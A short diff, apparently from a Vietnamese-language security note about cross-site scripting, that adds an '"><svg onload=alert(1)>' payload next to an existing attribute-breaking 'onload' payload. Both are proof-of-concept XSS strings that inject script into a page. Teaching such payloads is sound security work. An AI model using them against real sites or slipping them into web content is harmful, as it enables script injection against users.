@@ -11,3 +11,7 @@ Ta cũng có thể lợi dụng điểu này như việc khai thác các chủng
 ```
 a" onload="alert(origin)"
 ```
+
+```
+"><svg onload=alert(1)>
+```
